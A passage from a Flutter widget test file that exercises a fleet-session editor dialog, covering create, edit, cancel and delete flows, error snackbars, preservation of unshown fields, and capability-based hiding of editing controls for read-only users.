          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w');
          await robot.saveSession(expectPut: false);
          expect(robot.sessionDialogOpen, isTrue);
          expect(robot.sessionDialogError, startsWith('Repository'));
          await robot.cancelSession();
          await robot.settle();

        case 'positive_cancel_no_put':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'acme/w');
          await robot.cancelSession();
          expect(robot.sessionDialogOpen, isFalse);
          expect(robot.log.fired(putRpc), isFalse);
          await robot.settle();

        case 'negative_put_error_snack':
          await loadRoster([]);
          fake.failNext('Put', const GrpcError.invalidArgument('bad row'));
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'acme/w');
          await robot.saveSession();
          await robot.pumpUntil(() => robot.textShown('Save failed: bad row'),
              reason: 'failure snack');
          await robot.settle();

        case 'positive_edit_keeps_unshown_fields':
          final base = FleetSession(
            id: 's1',
            user: 'acme',
            repo: 'acme__w',
            forgeId: 'github-42',
            skill: 'old',
            slackTriggerChannel: 'C123',
            slackProgressChannel: 'C456',
            transportId: 'slack-main',
            pollSecs: Int64(900),
            enabled: true,
            createdAt: Int64(1700000000),
          );
          await loadRoster([base]);
          await robot.openSessionDialog('fleet.session.edit.s1');
          final idField = tester.widget(robot.byKey('fleet.session.dialog.id')) as dynamic;
          expect(idField.enabled, isFalse, reason: 'an edit cannot rename');
          await robot.fillSession(skill: 'new');
          await robot.saveSession();
          final put = lastPut();
          expect(put.skill, 'new');
          expect((put.id, put.user, put.repo, put.forgeId), ('s1', 'acme', 'acme__w', 'github-42'));
          expect((put.slackTriggerChannel, put.slackProgressChannel, put.transportId),
              ('C123', 'C456', 'slack-main'));
          expect((put.pollSecs.toInt(), put.enabled, put.createdAt.toInt()),
              (900, true, 1700000000));
          await robot.settle();

        case 'corner_edit_inline_row_keeps_inline':
          await loadRoster([
            FleetSession(id: 's1', user: 'acme', repo: 'acme__w', backend: 'github', tokenRef: 'env:GH_TOKEN')
          ]);
          await robot.openSessionDialog('fleet.session.edit.s1');
          expect(robot.textShown('Inline settings'), isTrue);
          await robot.saveSession();
          expect((lastPut().forgeId, lastPut().backend, lastPut().tokenRef),
              ('', 'github', 'env:GH_TOKEN'));
          await robot.settle();

        case 'corner_edit_moves_inline_to_card':
          await loadRoster([
            FleetSession(id: 's1', user: 'acme', repo: 'acme__w', backend: 'github', tokenRef: 'env:GH_TOKEN')
          ]);
          await robot.openSessionDialog('fleet.session.edit.s1');
          await robot.pickForge('github-42');
          await robot.saveSession();
          expect((lastPut().forgeId, lastPut().backend, lastPut().tokenRef),
              ('github-42', '', ''));
          await robot.settle();

        case 'corner_missing_card_kept':
          await loadRoster([session()..forgeId = 'gone'..user = 'owner'], cs: [card('github-42')]);
          await robot.openSessionDialog('fleet.session.edit.s1');
          expect(robot.textShown('gone (not found)'), isTrue);
          await robot.saveSession();
          expect(lastPut().forgeId, 'gone');
          await robot.settle();

        case 'positive_delete_opens_confirm':
          await loadRoster([session()]);
          await robot.openDelete('s1');
          expect(robot.exists('fleet.session.delete.confirm'), isTrue);
          expect(robot.log.fired(deleteRpc), isFalse);
          await robot.cancelDelete();
          await robot.settle();

        case 'positive_delete_fires':
          fake.deleteResponse = FleetDeleteReply(deleted: true);
          await loadRoster([session()]);
          final listsBefore = robot.log.countOf(rosterRpc);
          await robot.openDelete('s1');
          await robot.confirmDelete();
          expect((robot.log.last(deleteRpc)!.request as FleetSessionRef).id, 's1');
          await robot.pumpUntil(() => robot.log.countOf(rosterRpc) > listsBefore,
              reason: 'roster re-listed');
          await robot.pumpUntil(() => robot.textShown('s1 deleted.'), reason: 'snack');
          await robot.settle();

        case 'positive_delete_cancel_no_rpc':
          await loadRoster([session()]);
          await robot.openDelete('s1');
          await robot.cancelDelete();
          expect(robot.exists('fleet.session.delete.confirm'), isFalse);
          expect(robot.log.fired(deleteRpc), isFalse);
          await robot.settle();

        case 'corner_delete_already_gone':
          fake.deleteResponse = FleetDeleteReply(deleted: false);
          await loadRoster([session()]);
          await robot.openDelete('s1');
          await robot.confirmDelete();
          await robot.pumpUntil(() => robot.textShown('s1 was already gone.'),
              reason: 'snack');
          await robot.settle();

        case 'adversarial_viewer_sees_no_editor':
          await loadRoster([session()],
              caps: Capabilities.of(const ['read:review', 'read:fleet']));
          for (final k in ['fleet.session.new', 'fleet.session.edit.s1', 'fleet.session.delete.s1']) {
            expect(robot.exists(k), isFalse, reason: k);
          }
          await robot.settle();
          // A fresh page (not the same State under new capabilities).
          await tester.pumpWidget(const SizedBox());
          await loadRoster([session()],
              caps: Capabilities.of(const ['read:review', 'read:fleet', 'write:fleet']));
          expect(robot.exists('fleet.session.new'), isTrue);
          expect(robot.exists('fleet.session.edit.s1'), isTrue);
          expect(robot.exists('fleet.session.delete.s1'), isFalse);
          expect(robot.log.fired(putRpc), isFalse);
          expect(robot.log.fired(deleteRpc), isFalse);
          await robot.settle();

        default:
          fail('no test body for row ${row.label}');
      }
    });
  }
}
